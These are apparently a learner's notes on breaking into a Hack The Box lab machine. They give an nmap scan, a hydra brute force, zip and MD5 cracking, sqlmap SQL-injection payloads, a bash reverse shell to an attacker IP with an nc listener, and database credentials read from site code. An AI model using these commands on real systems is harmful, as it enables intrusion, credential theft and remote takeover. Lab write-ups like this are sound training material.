# 10.10.10.46

---

## nmap -sS -sV -sC -oX ./nmap/init.xml 10.10.10.46

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

---

## Found DDoS on vs-ftpd on port 21.

Script is in DDoS_on_vsftpd.py

vsftpd = "vsftpd, (or very secure FTP daemon),[1] is an FTP server for Unix-like systems, including Linux. It is the default FTP server in the Ubuntu, CentOS, Fedora, NimbleX, Slackware and RHEL Linux distributions. It is licensed under the GNU General Public License. It supports IPv6, TLS and FTPS (explicit since 2.0.0 and implicit since 2.1.0). "

++ [Wiki Source](https://en.wikipedia.org/wiki/Vsftpd)

++ [Exploit](https://www.exploit-db.com/exploits/49719)

---

## Found vsftpd < 3.0.3 Security Bypass Vulnerability

++ [Start Link](https://www.mageni.net/vulnerability/vsftpd-303-security-bypass-vulnerability-108045)

????

---

## Found exploit on SSH

++ [Main Link](https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits)

We can brute force.

---

## hydra -l root -P Passlist ftp://10.10.10.46

Used `root` as the username.
Common passwords don't work.

---

## HTTP has vulns

++ [CVE-2020-1934](https://nvd.nist.gov/vuln/detail/CVE-2020-1934)

++ [CVE-2020-1927](https://nvd.nist.gov/vuln/detail/CVE-2020-1927)

```
- In Apache HTTP Server 2.4.0 to 2.4.41, mod_proxy_ftp may use uninitialized memory when proxying to a malicious FTP server. (CVE-2020-1934)

- In Apache HTTP Server 2.4.0 to 2.4.41, redirects configured with mod_rewrite that were intended to be self-referential might be fooled by encoded newlines and redirect instead to an unexpected URL within the request URL. (CVE-2020-1927)
```

---

## Walkthrough gives the credentials for ftp.

Username: ftpuser

Password: mc@F1l3ZilL4

This probably needs to be enumarated.

---

## Inside the ftp

```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
2533 bytes received in 0.07 secs (35.0184 kB/s)
ftp> exit
221 Goodbye.
```

---

## The zip is password protected but can be cracked with JohntheRipper

Hashed the zip for john.

I used the website but there is a script inside official repo. Probably also in the program files itself. Might need to be compiled.

Gave hash to john with the wordlist from Seclist.

Password: 741852963

---

## Zip includes a index.php

The very first thing:
```
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```

Username: admin

Password: 2cb42f8734ea607eefed3b70af13bbd3 (hashed)

---

## Reverse the hash with crackstation

Type: md5

Result: qwerty789

So now,

Username: admin

Password: qwerty789

---

## We can enter the website and login with the credentials.

Inside there is a search bar.

Stored cookies reveal `PHPSESSID=lj4doc0q3ice032b0mndds6h18`.

---

## sqlmap http://10.10.10.46/dashboard.php?search=random --cookie="PHPSESSID=lj4doc0q3ice032b0mndds6h18"

```
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=random' AND (SELECT (CASE WHEN (8196=8196) THEN NULL ELSE CAST((CHR(119)||CHR(108)||CHR(81)||CHR(71)) AS NUMERIC) END)) IS NULL-- ggnh

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=random' AND 9816=CAST((CHR(113)||CHR(118)||CHR(113)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (9816=9816) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(113)||CHR(113)) AS NUMERIC)-- mtWO

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=random';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=random' AND 5881=(SELECT 5881 FROM PG_SLEEP(5))-- LvvK
---
[22:18:32] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL

```

---

## Running the same command with `--os-shell` gives back a linux shell

And openning up a reverse shell to connect to our machine moves us forward.
```
Self> sudo nc -lnvp 443
Target> bash -c 'bash -i >& /dev/tcp/10.10.16.72/443 0>&1'
```

---

## SHELL=/bin/bash script -q /dev/null

Privilage escalation.

---

## Inside http files

We find `dashboard.php`, and inside it we find:
```
...
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
...
```

Username: postgres
Password: P@s5w0rd!

---

## There is python3 in system.

We can run:
```
python3 -c "import pty;pty.spawn('/bin/bash')
```
And the password is the one we just found.

---

## Apparently the machine is unstable and is dropping sessions.

I had the same problem and the only viable solution is to reset the machine. Which is not a solution for me because the maimum number of resets for tha machine for the day ahs been reached. It should put things into perspective. Sad thing for a beginner machine but I have found a python script for SQL Injections.

Script is is sql_inj.py

++ [Repo Link](https://github.com/florianges/-HTB-Vaccine_sql_injection)

---

## That didn't work either. Done for now.
